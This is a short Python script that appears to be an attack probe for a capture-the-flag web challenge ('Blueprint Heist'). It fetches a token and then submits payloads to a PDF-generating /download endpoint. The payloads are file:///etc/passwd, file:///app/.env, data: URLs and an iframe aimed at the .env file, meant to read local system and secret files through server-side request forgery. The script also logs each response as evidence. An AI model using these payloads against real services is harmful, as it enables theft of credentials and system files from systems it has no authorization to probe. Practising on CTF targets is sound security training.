import re, urllib.parse, urllib.request, urllib.error, pathlib

base = "http://154.57.164.68:31206"
ev = pathlib.Path(r"D:\download\CTFTimeWriteup\HTB-TryOut\web\Blueprint Heist\solve\evidence")


def http(url, data=None, timeout=60):
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def extract_err(html: bytes) -> str:
    t = html.decode("utf-8", "replace")
    m = re.search(r"<p>(.*?)</p>", t, re.S)
    return (m.group(1) if m else t[:500])


_, tok = http(base + "/getToken")
user = tok.decode().strip()

urls = [
    "file:///etc/passwd",
    "file:///app/.env",
    "file://localhost/app/.env",
    "data:text/html,hello",
    "data:text/html;base64,PGgxPnRlc3Q8L2gxPg==",
    "data:text/html,<iframe src='file:///app/.env'></iframe>",
]
for u in urls:
    st, body = http(
        f"{base}/download?token={urllib.parse.quote(user)}",
        urllib.parse.urlencode({"url": u}).encode(),
        timeout=70,
    )
    snippet = body[:8]
    err = extract_err(body) if st != 200 else f"PDF/ok magic={snippet!r} len={len(body)}"
    print(f"Q: {u[:60]}? |+ status={st} {err[:220]!r} | -")
    (ev / f"dbg_u_{abs(hash(u))}.txt").write_text(f"{u}\n{st}\n{err}\n", encoding="utf-8")
